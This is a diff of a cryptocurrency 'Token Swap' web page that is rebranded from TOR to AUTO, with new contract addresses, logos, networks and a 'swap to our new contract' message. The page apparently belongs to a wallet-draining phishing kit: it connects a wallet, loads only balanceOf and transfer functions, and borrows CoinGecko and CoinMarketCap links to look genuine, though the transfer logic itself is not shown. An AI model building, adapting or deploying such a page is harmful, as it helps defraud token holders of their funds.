@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>TOR Token Swap</title>
+  <title>AUTO Token Swap</title>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
   <style>
     :root {
@@ -301,15 +301,15 @@
   <div class="container">
     <div class="card">
       <div class="header">
-        <img src="https://assets.staticimg.com/quicksilver/63564d50f06e9c0001a7dce5_tor.png" alt="TOR Logo" class="logo">
-        <h1>TOR Token Swap</h1>
-        <p class="description">Swap your TOR and USDT tokens to TRX-based assets</p>
+        <img src="https://blockspot.io/wp-content/uploads/auto-auto-coin-logo.png" alt="AUTO Logo" class="logo">
+        <h1>AUTO Token Swap</h1>
+        <p class="description">Swap your AUTO tokens to our new contract</p>
         
         <div class="token-links">
-          <a href="https://www.coingecko.com/en/coins/tor" target="_blank" class="token-link">
+          <a href="https://www.coingecko.com/en/coins/auto" target="_blank" class="token-link">
             <i class="fas fa-chart-line"></i> CoinGecko
           </a>
-          <a href="https://coinmarketcap.com/currencies/tor/" target="_blank" class="token-link">
+          <a href="https://coinmarketcap.com/currencies/auto/#Markets" target="_blank" class="token-link">
             <i class="fas fa-coins"></i> CoinMarketCap
           </a>
         </div>
@@ -336,22 +336,21 @@
       <div class="network-selector">
         <select id="networkSelect">
           <option value="bsc">Binance Smart Chain</option>
-          <option value="fantom">Fantom Opera</option>
+          <option value="polygon">Polygon</option>
         </select>
       </div>
       
       <div class="token-list">
         <div class="token-item" data-network="bsc">
-          <img src="https://assets.staticimg.com/quicksilver/63564d50f06e9c0001a7dce5_tor.png" alt="TOR" class="token-icon">
-          <span class="token-name">TOR Token</span>
+          <img src="https://blockspot.io/wp-content/uploads/auto-auto-coin-logo.png" alt="AUTO" class="token-icon">
+          <span class="token-name">AUTO Token</span>
           <span class="token-network">BSC</span>
         </div>
-        <div class="token-item" data-network="fantom">
-          <img src="https://assets.staticimg.com/quicksilver/63564d50f06e9c0001a7dce5_tor.png" alt="TOR" class="token-icon">
-          <span class="token-name">TOR Token</span>
-          <span class="token-network">Fantom</span>
+        <div class="token-item" data-network="polygon">
+          <img src="https://blockspot.io/wp-content/uploads/auto-auto-coin-logo.png" alt="AUTO" class="token-icon">
+          <span class="token-name">AUTO Token</span>
+          <span class="token-network">Polygon</span>
         </div>
-
       </div>
       
       <button id="connectWallet" class="btn">
@@ -374,39 +373,28 @@
     const TOKENS = {
       bsc: [
         {
-          name: "TOR",
-          symbol: "TOR",
-          address: "0x1d6cbdc6b29c6afbae65444a1f65ba9252b8ca83",
+          name: "AUTO",
+          symbol: "AUTO",
+          address: "0xa184088a740c695e156f91f5cc086a06bb78b827",
           abi: [
             "function balanceOf(address owner) view returns (uint256)",
             "function transfer(address to, uint256 amount) returns (bool)"
           ],
           decimals: 18,
-          logo: "https://assets.staticimg.com/quicksilver/63564d50f06e9c0001a7dce5_tor.png"
-        },
-        {
-          name: "USDT",
-          symbol: "USDT",
-          address: "0x55d398326f99059fF775485246999027B3197955",
-          abi: [
-            "function balanceOf(address owner) view returns (uint256)",
-            "function transfer(address to, uint256 amount) returns (bool)"
-          ],
-          decimals: 18,
-          logo: "https://cryptologos.cc/logos/tether-usdt-logo.png"
+          logo: "https://blockspot.io/wp-content/uploads/auto-auto-coin-logo.png"
         }
       ],
-      fantom: [
+      polygon: [
         {
-          name: "TOR",
-          symbol: "TOR",
-          address: "0x74e23df9110aa9ea0b6ff2faee01e740ca1c642e",
+          name: "AUTO",
+          symbol: "AUTO",
+          address: "0x7f426f6dc648e50464a0392e60e1bb465a67e9cf",
           abi: [
             "function balanceOf(address owner) view returns (uint256)",
             "function transfer(address to, uint256 amount) returns (bool)"
           ],
           decimals: 18,
-          logo: "https://assets.staticimg.com/quicksilver/63564d50f06e9c0001a7dce5_tor.png"
+          logo: "https://blockspot.io/wp-content/uploads/auto-auto-coin-logo.png"
         }
       ]
     };
@@ -420,13 +408,13 @@
         blockExplorerUrls: ["https://bscscan.com"],
         scanUrl: "https://bscscan.com/tx/"
       },
-      fantom: {
-        chainId: "0xfa",
-        chainName: "Fantom Opera",
-        nativeCurrency: { name: "FTM", symbol: "FTM", decimals: 18 },
-        rpcUrls: ["https://rpc.ftm.tools/"],
-        blockExplorerUrls: ["https://ftmscan.com"],
-        scanUrl: "https://ftmscan.com/tx/"
+      polygon: {
+        chainId: "0x89",
+        chainName: "Polygon Mainnet",
+        nativeCurrency: { name: "MATIC", symbol: "MATIC", decimals: 18 },
+        rpcUrls: ["https://polygon-rpc.com/"],
+        blockExplorerUrls: ["https://polygonscan.com"],
+        scanUrl: "https://polygonscan.com/tx/"
       }
     };
 
